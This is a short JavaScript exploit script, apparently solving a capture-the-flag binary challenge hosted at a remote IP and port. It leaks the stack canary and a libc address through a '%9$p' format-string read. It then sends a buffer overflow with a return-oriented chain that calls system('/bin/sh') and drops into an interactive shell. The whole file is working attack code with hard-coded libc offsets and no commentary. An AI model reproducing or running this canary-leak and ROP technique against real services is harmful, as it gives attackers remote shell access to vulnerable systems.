import nc from "../nc.js";
import convo from "../convo.js";
import { printf, shell } from "../util.js";

const cat = new nc("nc 204.48.21.205 30344");

const SYSTEM_LIBC = 349200n;
const PRINTF_LIBC = 413200n;
const BINSH_LIBC = 1799594n;
const POP_RDI = 0x0000000000026b72n;
await cat.toggleStdin();
await cat.toggleStdout();
await cat.write("%9$p\n")
const r = (await cat.readUntil("What is this? ")).toString().split('\n')[1].slice(2);
const CANARY = BigInt(parseInt(r.slice(0, r.indexOf('What'))));
printf("%p\n", CANARY);
const LIBC = BigInt(parseInt((await cat.readUntil("\n"))).toString()) - PRINTF_LIBC;
printf("%p\n", LIBC);
const OVERFLOW = "A".repeat(0x18);
const buffer = convo.raw([
    OVERFLOW,
    CANARY,
    0x0n,
    POP_RDI + LIBC, BINSH_LIBC + LIBC,
    POP_RDI + LIBC + 1n,
    SYSTEM_LIBC  + LIBC,
    "\n"
]);
const b = Buffer.alloc(200).fill(".")
b.set(buffer);
await cat.write(b);

await cat.interactive();